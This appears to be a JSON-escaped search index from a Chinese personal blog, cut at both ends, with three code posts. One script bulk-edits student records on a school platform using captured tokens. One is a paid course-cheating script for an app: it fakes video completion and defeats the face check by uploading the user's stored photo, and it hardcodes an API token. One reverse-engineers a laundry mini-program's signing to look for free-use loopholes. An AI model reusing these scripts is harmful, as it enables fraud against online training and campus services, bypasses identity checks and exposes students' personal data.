\u0026#34;application/json;charset=UTF-8\u0026#34;, \u0026#34;Host\u0026#34;: \u0026#34;zzxx.scedu.net\u0026#34;, \u0026#34;menu\u0026#34;: \u0026#34;/head/Page/tour1/stuInfo\u0026#34;, \u0026#34;Origin\u0026#34;: \u0026#34;http://zzxx.scedu.net\u0026#34;, \u0026#34;Referer\u0026#34;: \u0026#34;http://zzxx.scedu.net/msc/\u0026#34;, \u0026#34;token\u0026#34;: \u0026#34;9a8d3b3ab899babd6892a7f9de8267d7\u0026#34;, \u0026#34;User-Agent\u0026#34;: \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.56\u0026#34;, \u0026#34;userId\u0026#34;: \u0026#34;9a8d3b3ab899babd6892a7f9de8267d7\u0026#34; } data = {\u0026#34;userId\u0026#34;: \u0026#34;402842bf84a3460e0184a888180718e6\u0026#34;, \u0026#34;page\u0026#34;: 1, \u0026#34;limit\u0026#34;: 10, \u0026#34;addTime\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;addUser\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;bj\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;csrq\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;gj\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;gjxzqhmc\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;id\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;mz\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;nj\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;sfjdlkpkjt\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;sfsqzn\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;sfxjxzndbxs\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;sfzjh\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;status\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;syd\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;szdqxzqhm\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;upTime\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;upUser\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;xb\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;xm\u0026#34;: name, \u0026#34;xslb\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;xxdm\u0026#34;: \u0026#34;3651000395\u0026#34;, \u0026#34;xz\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;zy\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;jxdh\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;sfxwjxdxs\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;sszy\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;sznj\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;bjmc\u0026#34;: \u0026#34;20级会计1班\u0026#34;, \u0026#34;sing\u0026#34;: \u0026#34;48e7adadcc4ac6c59bc4a0d28d02bdc7\u0026#34;, \u0026#34;time\u0026#34;: \u0026#34;1669709818000\u0026#34;} d = [\u0026#39;addTime\u0026#39;, \u0026#39;addUser\u0026#39;, \u0026#39;bj\u0026#39;, \u0026#39;bjmc\u0026#39;, \u0026#39;csrq\u0026#39;, \u0026#39;gj\u0026#39;, \u0026#39;gjxzqhmc\u0026#39;, \u0026#39;id\u0026#39;, \u0026#39;jxdh\u0026#39;, \u0026#39;limit\u0026#39;, \u0026#39;mz\u0026#39;, \u0026#39;nj\u0026#39;, \u0026#39;page\u0026#39;, \u0026#39;sfjdlkpkjt\u0026#39;, \u0026#39;sfsqzn\u0026#39;, \u0026#39;sfxjxzndbxs\u0026#39;, \u0026#39;sfxwjxdxs\u0026#39;, \u0026#39;sfzjh\u0026#39;, \u0026#39;sszy\u0026#39;, \u0026#39;status\u0026#39;, \u0026#39;syd\u0026#39;, \u0026#39;szdqxzqhm\u0026#39;, \u0026#39;sznj\u0026#39;, \u0026#39;upTime\u0026#39;, \u0026#39;upUser\u0026#39;, \u0026#39;userId\u0026#39;, \u0026#39;xb\u0026#39;, \u0026#39;xm\u0026#39;, \u0026#39;xslb\u0026#39;, \u0026#39;xxdm\u0026#39;, \u0026#39;xz\u0026#39;, \u0026#39;zy\u0026#39;] result = requests.post(url, json=sing(data, d), headers=header).json() return result def update(data, name): g = {\u0026#39;父女\u0026#39;: 0, \u0026#39;母女\u0026#39;: 1, \u0026#39;父子\u0026#39;: 2, \u0026#39;母子\u0026#39;: 3} if data[\u0026#39;xbm\u0026#39;] == \u0026#39;男\u0026#39;: if name[0] == data[\u0026#39;xm\u0026#39;][0]: w = \u0026#39;父子\u0026#39; else: w = \u0026#39;母子\u0026#39; else: if name[0] == data[\u0026#39;xm\u0026#39;][0]: w = \u0026#39;父女\u0026#39; else: w = \u0026#39;母女\u0026#39; print(w) header = { \u0026#34;Accept\u0026#34;: \u0026#34;application/json, text/plain, */*\u0026#34;, \u0026#34;Accept-Encoding\u0026#34;: \u0026#34;gzip, deflate\u0026#34;, \u0026#34;Accept-Language\u0026#34;: \u0026#34;zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6\u0026#34;, \u0026#34;Connection\u0026#34;: \u0026#34;keep-alive\u0026#34;, \u0026#34;Content-Length\u0026#34;: \u0026#34;913\u0026#34;, \u0026#34;Content-Type\u0026#34;: \u0026#34;application/json;charset=UTF-8\u0026#34;, \u0026#34;Host\u0026#34;: \u0026#34;zzxx.scedu.net\u0026#34;, \u0026#34;menu\u0026#34;: \u0026#34;/head/Page/tour1/stuInfo\u0026#34;, \u0026#34;Origin\u0026#34;: \u0026#34;http://zzxx.scedu.net\u0026#34;, \u0026#34;Referer\u0026#34;: \u0026#34;http://zzxx.scedu.net/msc/\u0026#34;, \u0026#34;token\u0026#34;: \u0026#34;9a8d3b3ab899babd6892a7f9de8267d7\u0026#34;, \u0026#34;User-Agent\u0026#34;: \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.56\u0026#34;, \u0026#34;userId\u0026#34;: \u0026#34;9a8d3b3ab899babd6892a7f9de8267d7\u0026#34; } # d = [\u0026#39;addTime\u0026#39;, \u0026#39;addUser\u0026#39;, \u0026#39;bkbxyym\u0026#39;, \u0026#39;bkbxyymArr\u0026#39;, \u0026#39;cjlxm\u0026#39;, \u0026#39;id\u0026#39;, \u0026#39;jdfsm\u0026#39;, \u0026#39;jtlb\u0026#39;, \u0026#39;jtlbs\u0026#39;, \u0026#39;rxfsm\u0026#39;, \u0026#39;rxqxlm\u0026#39;, \u0026#39;sfjs\u0026#39;, # \u0026#39;sfnm\u0026#39;, \u0026#39;status\u0026#39;, \u0026#39;syd\u0026#39;, \u0026#39;sylx\u0026#39;, \u0026#39;upTime\u0026#39;, \u0026#39;upUser\u0026#39;, \u0026#39;xjh\u0026#39;, \u0026#39;xm\u0026#39;, \u0026#39;xnd\u0026#39;, \u0026#39;xsdqztm\u0026#39;, \u0026#39;xslbm\u0026#39;, \u0026#39;xslym\u0026#39;, \u0026#39;xxdm\u0026#39;, \u0026#39;xxxsm\u0026#39;] # json = {\u0026#34;addTime\u0026#34;: data[\u0026#39;addTime\u0026#39;], \u0026#34;addUser\u0026#34;: data[\u0026#39;addUser\u0026#39;], \u0026#34;bkbxyym\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;cjlxm\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;id\u0026#34;: data[\u0026#39;id\u0026#39;], \u0026#34;jdfsm\u0026#34;: \u0026#34;2\u0026#34;, \u0026#34;lydqm\u0026#34;: \u0026#39;\u0026#39;, \u0026#34;pyfsm\u0026#34;: \u0026#39;\u0026#39;, \u0026#34;rxfsm\u0026#34;: \u0026#34;01\u0026#34;, \u0026#34;rxqxlm\u0026#34;: \u0026#34;71\u0026#34;, \u0026#34;sfcjr\u0026#34;: \u0026#39;\u0026#39;, \u0026#34;sfczhkznc\u0026#34;: \u0026#39;\u0026#39;, \u0026#34;sfczxgzg\u0026#34;: \u0026#39;\u0026#39;, \u0026#34;sfdbh\u0026#34;: \u0026#39;\u0026#39;, \u0026#34;sfddpy\u0026#34;: \u0026#39;\u0026#39;, \u0026#34;sfdqjtzn\u0026#34;: \u0026#39;\u0026#39;, \u0026#34;sfdszn\u0026#34;: \u0026#39;\u0026#39;, \u0026#34;sfge\u0026#34;: \u0026#39;\u0026#39;, \u0026#34;sfhq\u0026#34;: \u0026#39;\u0026#39;, \u0026#34;sfjcwgry\u0026#34;: \u0026#39;\u0026#39;, \u0026#34;sfjdlkpkjt\u0026#34;: \u0026#39;\u0026#39;, \u0026#34;sfjs\u0026#34;: \u0026#34;2\u0026#34;, \u0026#34;sfldrk\u0026#34;: \u0026#39;\u0026#39;, \u0026#34;sflset\u0026#34;: \u0026#39;\u0026#39;, \u0026#34;sflshyfzn\u0026#34;: \u0026#39;\u0026#39;, \u0026#34;sflzjd\u0026#34;: \u0026#39;\u0026#39;, \u0026#34;sfndzzb\u0026#34;: \u0026#39;\u0026#39;, # \u0026#34;sfnm\u0026#34;: \u0026#34;2\u0026#34;, \u0026#34;sfpkdq\u0026#34;: \u0026#39;\u0026#39;, \u0026#34;sfsjbys\u0026#34;: \u0026#39;\u0026#39;, \u0026#34;sfsqzn\u0026#34;: \u0026#39;\u0026#39;, \u0026#34;sftwjrhxyjrzn\u0026#34;: \u0026#39;\u0026#39;, \u0026#34;sftysb\u0026#34;: \u0026#39;\u0026#39;, \u0026#34;sfwlwgryzn\u0026#34;: \u0026#39;\u0026#39;, \u0026#34;sfxxzynm\u0026#34;: \u0026#39;\u0026#39;, \u0026#34;status\u0026#34;: \u0026#34;0\u0026#34;, \u0026#34;syd\u0026#34;: data[\u0026#39;hkszd\u0026#39;][:3]+\u0026#34;000000000\u0026#34;, \u0026#34;sylx\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;tc\u0026#34;: \u0026#39;\u0026#39;, \u0026#34;upTime\u0026#34;: data[\u0026#39;upTime\u0026#39;], \u0026#34;upUser\u0026#34;: \u0026#34;qzk\u0026#34;, \u0026#34;xjh\u0026#34;: data[\u0026#39;xjh\u0026#39;], \u0026#34;xm\u0026#34;: data[\u0026#39;xm\u0026#39;], \u0026#34;xnd\u0026#34;: data[\u0026#39;xnd\u0026#39;], \u0026#34;xsdqztm\u0026#34;: \u0026#34;01\u0026#34;, \u0026#34;xslbm\u0026#34;: \u0026#34;6\u0026#34;, \u0026#34;xslym\u0026#34;: \u0026#34;102\u0026#34;, \u0026#34;xxdm\u0026#34;: \u0026#34;3651000395\u0026#34;, \u0026#34;xxxsm\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;jtlb\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;jtlbs\u0026#34;: [\u0026#34;1\u0026#34;], \u0026#34;bkbxyymArr\u0026#34;: [], \u0026#34;sing\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;time\u0026#34;: \u0026#34;\u0026#34;} # result = requests.post( # \u0026#34;http://zzxx.scedu.net/msc-api/api/tour/stuInformation/update\u0026#34;, # json=sing(json, d), # headers=header).json() # if result[\u0026#39;code\u0026#39;]==0: # print(data[\u0026#39;xm\u0026#39;]+\u0026#39;---\u0026gt;基本属性ok\u0026#39;) # else: # print(data[\u0026#39;xm\u0026#39;]+\u0026#39;---\u0026gt;基本属性,出现错误---\u0026gt;\u0026#39;,result) json = {\u0026#34;addTime\u0026#34;: data[\u0026#39;addTime\u0026#39;], \u0026#34;addUser\u0026#34;: data[\u0026#39;addUser\u0026#39;], \u0026#34;brlxdh\u0026#34;: \u0026#39;\u0026#39;, \u0026#34;chcqj\u0026#34;: \u0026#39;\u0026#39;, \u0026#34;csdm\u0026#34;: data[\u0026#39;csdm\u0026#39;], \u0026#34;csrq\u0026#34;: data[\u0026#39;csrq\u0026#39;], \u0026#34;cym\u0026#34;: \u0026#39;\u0026#39;, \u0026#34;dzxx\u0026#34;: \u0026#39;\u0026#39;, \u0026#34;gatqwm\u0026#34;: \u0026#34;00\u0026#34;, \u0026#34;gjdq\u0026#34;: \u0026#34;156\u0026#34;, \u0026#34;hyzk\u0026#34;: \u0026#39;\u0026#39;, \u0026#34;id\u0026#34;: data[\u0026#39;id\u0026#39;], \u0026#34;jg\u0026#34;: data[\u0026#39;jg\u0026#39;], \u0026#34;jkzkm\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;jtdh\u0026#34;: \u0026#39;\u0026#39;, \u0026#34;jtxdz\u0026#34;: \u0026#34;:\u0026#39;\u0026#39;\u0026#34;, \u0026#34;jtxdz1\u0026#34;: \u0026#39;\u0026#39;, \u0026#34;jtyzbm\u0026#34;: data[\u0026#39;jtyzbm\u0026#39;], \u0026#34;ljzjhcz\u0026#34;: \u0026#39;\u0026#39;, \u0026#34;lxrdh\u0026#34;: \u0026#39;\u0026#39;, \u0026#34;lxrxm\u0026#34;: name, \u0026#34;mzm\u0026#34;: \u0026#34;01\u0026#34;, \u0026#34;qq\u0026#34;: \u0026#39;\u0026#39;, \u0026#34;sfcgqssjj\u0026#34;: \u0026#34;0\u0026#34;, \u0026#34;sfpkdqxs\u0026#34;: \u0026#34;0\u0026#34;, \u0026#34;sfszsqxs\u0026#34;: \u0026#34;0\u0026#34;, \u0026#34;sfzjh\u0026#34;: data[\u0026#39;sfzjh\u0026#39;], \u0026#34;sfzjlxm\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;sfzjyxq\u0026#34;: \u0026#39;\u0026#39;, \u0026#34;ssxxbsm\u0026#34;: \u0026#34;3651000395\u0026#34;, \u0026#34;ssxxmc\u0026#34;: \u0026#34;资阳汽车科技职业学校\u0026#34;, \u0026#34;status\u0026#34;: \u0026#34;0\u0026#34;, \u0026#34;upTime\u0026#34;: data[\u0026#39;upTime\u0026#39;], \u0026#34;upUser\u0026#34;: \u0026#34;qzk\u0026#34;, \u0026#34;wx\u0026#34;: \u0026#39;\u0026#39;, \u0026#34;xbm\u0026#34;: data[\u0026#39;xbm\u0026#39;], \u0026#34;xh\u0026#34;: data[\u0026#39;xh\u0026#39;], \u0026#34;xjh\u0026#34;: data[\u0026#39;xjh\u0026#39;], \u0026#34;xm\u0026#34;: data[\u0026#39;xm\u0026#39;], \u0026#34;xmpy\u0026#34;: data[\u0026#39;xmpy\u0026#39;], \u0026#34;xnd\u0026#34;: data[\u0026#39;xnd\u0026#39;], \u0026#34;xx\u0026#34;: \u0026#39;\u0026#39;, \u0026#34;xxdm\u0026#34;: \u0026#34;3651000395\u0026#34;, \u0026#34;xyzjm\u0026#34;: \u0026#39;\u0026#39;, \u0026#34;ylxrgx\u0026#34;: g[w], \u0026#34;ywxm\u0026#34;: \u0026#39;\u0026#39;, \u0026#34;zp\u0026#34;: data[\u0026#39;zp\u0026#39;], \u0026#34;zydm\u0026#34;: data[\u0026#39;zydm\u0026#39;], \u0026#34;zyjn\u0026#34;: \u0026#39;\u0026#39;, \u0026#34;zymc\u0026#34;: data[\u0026#39;zymc\u0026#39;], \u0026#34;zzmmm\u0026#34;: \u0026#34;13\u0026#34;, \u0026#34;jxdh\u0026#34;: \u0026#39;\u0026#39;, \u0026#34;sfxwjxdxs\u0026#34;: \u0026#39;\u0026#39;, \u0026#34;schooName\u0026#34;: \u0026#39;\u0026#39;, \u0026#34;sznj\u0026#34;: data[\u0026#39;sznj\u0026#39;], \u0026#34;szbj\u0026#34;: data[\u0026#39;szbj\u0026#39;], \u0026#34;lxdh\u0026#34;: data[\u0026#39;lxdh\u0026#39;], \u0026#34;xsdqzt\u0026#34;: \u0026#34;01\u0026#34;, \u0026#34;hkszd\u0026#34;: data[\u0026#39;hkszd\u0026#39;], \u0026#34;hkszd1\u0026#34;: \u0026#39;\u0026#39;, \u0026#34;hkxz\u0026#34;: \u0026#34;2\u0026#34;, \u0026#34;sing\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;time\u0026#34;: \u0026#34;\u0026#34;} d = [\u0026#39;addTime\u0026#39;, \u0026#39;addUser\u0026#39;, \u0026#39;csdm\u0026#39;, \u0026#39;csrq\u0026#39;, \u0026#39;gatqwm\u0026#39;, \u0026#39;gjdq\u0026#39;, \u0026#39;hkszd\u0026#39;, \u0026#39;hkxz\u0026#39;, \u0026#39;id\u0026#39;, \u0026#39;jg\u0026#39;, \u0026#39;jkzkm\u0026#39;, \u0026#39;jtxdz\u0026#39;, \u0026#39;jtyzbm\u0026#39;, \u0026#39;lxdh\u0026#39;, \u0026#39;lxrxm\u0026#39;, \u0026#39;mzm\u0026#39;, \u0026#39;sfcgqssjj\u0026#39;, \u0026#39;sfpkdqxs\u0026#39;, \u0026#39;sfszsqxs\u0026#39;, \u0026#39;sfzjh\u0026#39;, \u0026#39;sfzjlxm\u0026#39;, \u0026#39;ssxxbsm\u0026#39;, \u0026#39;ssxxmc\u0026#39;, \u0026#39;status\u0026#39;, \u0026#39;szbj\u0026#39;, \u0026#39;sznj\u0026#39;, \u0026#39;upTime\u0026#39;, \u0026#39;upUser\u0026#39;, \u0026#39;xbm\u0026#39;, \u0026#39;xh\u0026#39;, \u0026#39;xjh\u0026#39;, \u0026#39;xm\u0026#39;, \u0026#39;xmpy\u0026#39;, \u0026#39;xnd\u0026#39;, \u0026#39;xsdqzt\u0026#39;, \u0026#39;xxdm\u0026#39;, \u0026#39;ylxrgx\u0026#39;, \u0026#39;zp\u0026#39;, \u0026#39;zydm\u0026#39;, \u0026#39;zymc\u0026#39;, \u0026#39;zzmmm\u0026#39;] result = requests.post(\u0026#39;http://zzxx.scedu.net/msc-api/api/tour/stuInfo/update\u0026#39;, json=sing(json, d), headers=header).json() if result[\u0026#39;code\u0026#39;]==0: print(data[\u0026#39;xm\u0026#39;]+\u0026#39;---\u0026gt;基本信息ok\u0026#39;) else: print(data[\u0026#39;xm\u0026#39;]+\u0026#39;---\u0026gt;基本信息,出现错误---\u0026gt;\u0026#39;,result) a=[] b=[] for m,n in zip(a,b): k = l(m) if len(k[\u0026#39;data\u0026#39;][\u0026#39;list\u0026#39;])==0: print(\u0026#39;??????\u0026#39;) continue update(k[\u0026#39;data\u0026#39;][\u0026#39;list\u0026#39;][0], n) a=学生姓名\nb=家长姓名\n记得换token\n"},{"id":119,"href":"/docs/code/new/%E6%9F%90%E5%88%B7%E8%AF%BE/","title":"某刷课","section":"ee","content":"接的单子，老板大气给了200后不见踪影\n无任何难度，android rsa，第二次加入了人脸识别，幌子，直接用实名的人脸绕过\nfrom Crypto.PublicKey import RSA from Crypto.Cipher import PKCS1_v1_5 import base64,requests KEY=\u0026#39;MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC3Vsn6GuSivbc0mh1QFDjFVMdkb7lcAfsGdw6WuR0yM4GBP5MCJr301VX5aQucOKmpnpR4mhMSaCG0AVbK9VBNlghFcihfn3u4uMPGtqtXzKSJNZmLrzrS7Xd0ecUcAGHAnpEnXXgoUoYrAkthwKTBDayEIygQBrq+nMX53gST9QIDAQAB\u0026#39; def RSA_encrypt(clear): if clear==\u0026#39;\u0026#39;: return \u0026#39;\u0026#39; rsa_key = RSA.import_key(base64.b64decode(KEY)) cipher = PKCS1_v1_5.new(rsa_key) return base64.b64encode(cipher.encrypt(str(clear).encode(\u0026#39;utf-8\u0026#39;))).decode() def course_list(): url=\u0026#39;http://app.lfanpei.com/api/index/apiSafeLearning/learningCourseDetail\u0026#39; data={\u0026#39;apiToken\u0026#39;:\u0026#39;\u0026#39;,\u0026#39;classId\u0026#39;:classid,\u0026#39;courseId\u0026#39;:courseId} data={k:RSA_encrypt(v) for k,v in data.items()} data[\u0026#39;apiToken\u0026#39;]=TOKEN #print(data) result=requests.post(url,data=data) # print(result.text) cl=[] for i in result.json()[\u0026#39;data\u0026#39;][\u0026#39;apiSafeCourseDetail\u0026#39;][\u0026#39;safeCourseChaptersList\u0026#39;]: for j in i[\u0026#39;apiSafeCourseviewList\u0026#39;]: if j[\u0026#39;faceContrastTimes\u0026#39;]!=1: face_Comparison() return 0 if j[\u0026#39;viewOver\u0026#39;]!=1: # 1 为已完成的 cl.append([j[\u0026#39;viewId\u0026#39;],TIME,j[\u0026#39;courseViewHours\u0026#39;],j[\u0026#39;viewTitle\u0026#39;]]) else: print(\u0026#39;已完成\u0026#39;,j[\u0026#39;viewTitle\u0026#39;]) return cl def learm_update(): url=\u0026#39;http://app.lfanpei.com/api/video/apiSafeView/saveVideoPlayProgress\u0026#39; data={\u0026#39;apiToken\u0026#39;:\u0026#39;\u0026#39;,\u0026#39;classId\u0026#39;:classid,\u0026#39;courseId\u0026#39;:courseId,\u0026#39;viewfileId\u0026#39;:viewfileid,\u0026#39;curPercent\u0026#39;:\u0026#39;100\u0026#39;,\u0026#39;curChapter\u0026#39;:\u0026#39;0\u0026#39;,\u0026#39;viewTime\u0026#39;:TIME,\u0026#39;curView\u0026#39;:\u0026#39;1\u0026#39;,\u0026#39;viewOver\u0026#39;:\u0026#39;1\u0026#39;} data={k:RSA_encrypt(v) for k,v in data.items()} data[\u0026#39;apiToken\u0026#39;]=TOKEN result=requests.post(url,json=data) print(\u0026#39;\\t\u0026#39;+result.text) if \u0026#39;不符\u0026#39; in result.text: print(\u0026#39;--------------- id \u0026#39;,viewTitle,courseViewHours) print(\u0026#39;exit-----------\u0026#39;) exit() def learm_begin(): url=\u0026#39;http://app.lfanpei.com/api/video/apiSafeView/updateVideoBeginTime\u0026#39; data={\u0026#39;apiToken\u0026#39;:\u0026#39;\u0026#39;,\u0026#39;classId\u0026#39;:classid,\u0026#39;courseId\u0026#39;:courseId,\u0026#39;viewfileId\u0026#39;:viewfileid,\u0026#39;ip\u0026#39;:\u0026#39;127.0.0.1\u0026#39;} data={k:RSA_encrypt(v) for k,v in data.items()} data[\u0026#39;apiToken\u0026#39;]=TOKEN result=requests.post(url,data=data) print(\u0026#39;\\t\u0026#39;+result.text) def learm_list(): data = {\u0026#39;apiToken\u0026#39;: TOKEN} result = requests.post(\u0026#39;http://app.lfanpei.com/api/index/apiSafeLearning/oneClickLearningIndex\u0026#39;, data=data) # print(result.text) ll=[] for i in result.json()[\u0026#39;data\u0026#39;][\u0026#39;learningIndexData\u0026#39;][\u0026#39;classmateLearningList\u0026#39;]: ll.append([i[\u0026#39;classId\u0026#39;],i[\u0026#39;name\u0026#39;]]) # print(i[\u0026#39;classId\u0026#39;],i[\u0026#39;name\u0026#39;]) return ll # 人脸图片对比 def face_Comparison(): c=requests.get(get_face_img()).content files={\u0026#39;headPictureFile\u0026#39;:c} data={\u0026#39;apiToken\u0026#39;:\u0026#39;\u0026#39;, \u0026#39;buisnessId\u0026#39;:classid, \u0026#39;buisnessType\u0026#39;:1, \u0026#39;viewId\u0026#39;:courseid, \u0026#39;courseId\u0026#39;:courseId } data={k:RSA_encrypt(v) for k,v in data.items()} data[\u0026#39;apiToken\u0026#39;]=TOKEN result=requests.post(\u0026#39;http://app.lfanpei.com/api/liveCheck/apiSafeFace/faceComparison\u0026#39;,data=data,files=files) print(result.text) def get_face_img(): url=\u0026#39;http://app.lfanpei.com/api/user/apiSafeUserInfo/queryUserClassInfo\u0026#39; data={\u0026#39;apiToken\u0026#39;:\u0026#39;\u0026#39;,\u0026#39;classId\u0026#39;:classid} data={k:RSA_encrypt(v) for k,v in data.items()} data[\u0026#39;apiToken\u0026#39;]=TOKEN result=requests.post(url,data).json() # print(result) return result[\u0026#39;data\u0026#39;][\u0026#39;apiClassInformationPo\u0026#39;][\u0026#39;apiUserDataSubmit\u0026#39;][\u0026#39;picture\u0026#39;] # 暂时无用 # def get_classid(): # url=\u0026#39;http://app.lfanpei.com/api/user/apiSafeUserInfo/dataRevision\u0026#39; # result=requests.post(url,data={\u0026#39;apiToken\u0026#39;:TOKEN}).json() # return result[\u0026#39;data\u0026#39;][\u0026#39;classList\u0026#39;][0][\u0026#39;class_id\u0026#39;] TOKEN=\u0026#39;Api eyJhbGciOiJIUzUxMiJ9.eyJhcGlfbG9naW5fdXNlcl9rZXkiOiIzODgwOCNhNzUwMzljYy1mYjUyLTRjZWUtYjY5Ny0zMzRlMTI2YjNjNmIifQ.yQpzqsx1xP4AEmPh_goIQJY61mVTcGWS3Wdqx5FRAgrC89Mm5g_-OYWSTK_kR0bTELxxyoRvDkhxV1n-iOpweQ\u0026#39; courseId=\u0026#39;1603\u0026#39; classid=\u0026#39;279\u0026#39; viewfileid=\u0026#39;3410\u0026#39; # 设置一个时间 200000——6000000 TIME=\u0026#39;510000\u0026#39; # face_Comparison() # learm_begin() # learm_update() # print(get_face_img()) learm_type=1 # 1-\u0026gt;一键学习 if __name__ == \u0026#39;__main__\u0026#39;: if learm_type: for classid,learm_title in learm_list(): print(\u0026#39;当前学习classid\u0026#39;,classid,learm_title) for viewfileid,TIME,courseViewHours,viewTitle in course_list(): print(viewfileid,TIME,courseViewHours,viewTitle) # print(\u0026#39;\\t当前课程courseid\u0026#39;,courseid,viewTitle,courseViewHours) learm_begin() learm_update() else: if TOKEN and courseid: for courseid,TIME,courseViewHours,viewTitle in course_list(): print(\u0026#39;当前课程courseid\u0026#39;,courseid,viewTitle,courseViewHours) learm_begin() learm_update() # eyJhbGciOiAiTm9uZSJ9.eyJhcGlfbG9naW5fdXNlcl9rZXkiOiAiMzc0ODAjODAzYzk3MTItZTYwOC00YTM4LWE1ZjgtNGE5ZGQzNDQxYjA3In0K. "},{"id":120,"href":"/docs/code/new/%E6%9F%90%E6%B4%97%E8%A1%A3%E5%B0%8F%E7%A8%8B%E5%BA%8F/","title":"某洗衣小程序","section":"ee","content":"\r小程序逆向\r#\r一个学校的洗衣平台，本想看看有没有洞可嫖之类的，可奈何实力不够,app的防护太难了\n而小程序实现了简单的功能，所有就是先看看小程序\n抓包\n抓包的话，我用的手机，电脑也行\n因为是扫码获取洗衣机设备信息\n多次抓包ssid和sign发生变化，tokenid应该是登录给的\n解包\n解包在网上找的软件，\n微信版本3.7.0.26，解包tool链接：https://pan.baidu.com/s/149IQ34rS3Rvq39koVFUgrA?pwd=52pj 提取码：52pj\n分析\n先看ssid,大体搜一下，基本确定\ni.ssid=r(),i.sign=n(i) 再跟踪一下\nmodule.exports = { getTime: function() { return a.apply(this, arguments); } }; 有些虽不到，但猜一下还是可以的\nsign\nreturn i.ssid = e.sent, i.tokenId = wx.getStorageSync(\u0026#34;TOKEN_ID\u0026#34;) || \u0026#34;\u0026#34;, i.sign = n(i), var r = require(\u0026#34;DAE7432162ABF0DFBC812B26691258B4.js\u0026#34;); Array.prototype.indexVf = function(r) { for (var e = 0; e \u0026lt; this.length; e++) if (this[e] == r) return e; }, module.exports = { getSign: function(e) { var t = [], n = [], i = []; for (var s in e) t.push(s), i.push(s), n.push(e[s]);// for (var o = i.sort(), u = \u0026#34;SING=HLYF\u0026#34;, f = 0; f \u0026lt; o.length; f++) if (\u0026#34;tokenId\u0026#34; != o[f] \u0026amp;\u0026amp; \u0026#34;ssid\u0026#34; != o[f] \u0026amp;\u0026amp; \u0026#34;sign\u0026#34; != o[f]) { var a = t.indexVf(o[f]); \u0026#34;\u0026#34; != n[a] \u0026amp;\u0026amp; null != n[a] \u0026amp;\u0026amp; (u = u + \u0026#34;\u0026amp;\u0026#34; + o[f] + \u0026#34;=\u0026#34; + n[a]); } return \u0026#34;SING=HLYF\u0026#34; == (u = u.toUpperCase()) \u0026amp;\u0026amp; (u = \u0026#34;SING=HLYF\u0026amp;\u0026#34;), u = r.hex_md5(u); } }; 稍作修改，抠几个函数下来\nfunction sign(e) { Array.prototype.indexVf = function (r) { for (var e = 0; e \u0026lt; this.length; e++) if (this[e] == r) return e; } var t = [], n = [], i = []; for (var s in e) t.push(s), i.push(s), n.push(e[s]); for (var o = i.sort(), u = \u0026#34;SING=HLYF\u0026#34;, f = 0; f \u0026lt; o.length; f++) if (\u0026#34;tokenId\u0026#34; != o[f] \u0026amp;\u0026amp; \u0026#34;ssid\u0026#34; != o[f] \u0026amp;\u0026amp; \u0026#34;sign\u0026#34; != o[f]) { var a = t.indexVf(o[f]); \u0026#34;\u0026#34; != n[a] \u0026amp;\u0026amp; null != n[a] \u0026amp;\u0026amp; (u = u + \u0026#34;\u0026amp;\u0026#34; + o[f] + \u0026#34;=\u0026#34; + n[a]); } return \u0026#34;SING=HLYF\u0026#34; == (u = u.toUpperCase()) \u0026amp;\u0026amp; (u = \u0026#34;SING=HLYF\u0026amp;\u0026#34;), u = md5(u); } ok,请求成功\n对于这种我只能想到一些逻辑漏洞，找了半天也没有什么头绪，\njscode\nfunction getsign(i) { return sign(i) } function r(r) { var a = new Array(), n = r.length, s = parseInt(n / 4), f = n % 4, o = 0; for (o = 0; o \u0026lt; s; o++) a[o] = e(r.substring(4 * o + 0, 4 * o + 4)); return f \u0026gt; 0 \u0026amp;\u0026amp; (a[o] = e(r.substring(4 * o + 0, n))), a; } function e(r) { var e = r.length, a = new Array(64), n = 0, s = 0, f = 0, o = 0; if (e \u0026lt; 4) { for (n = 0; n \u0026lt; e; n++) { var c = r.charCodeAt(n); for (s = 0; s \u0026lt; 16; s++) { var t = 1, l = 0; for (l = 15; l \u0026gt; s; l--) t *= 2; a[16 * n + s] = parseInt(c / t) % 2; } } for (f = e; f \u0026lt; 4; f++) { c = 0; for (o = 0; o \u0026lt; 16; o++) { t = 1, l = 0; for (l = 15; l \u0026gt; o; l--) t *= 2; a[16 * f + o] = parseInt(c / t) % 2; } } } else for (n = 0; n \u0026lt; 4; n++) { c = r.charCodeAt(n); for (s = 0; s \u0026lt; 16; s++) { t = 1; for (l = 15; l 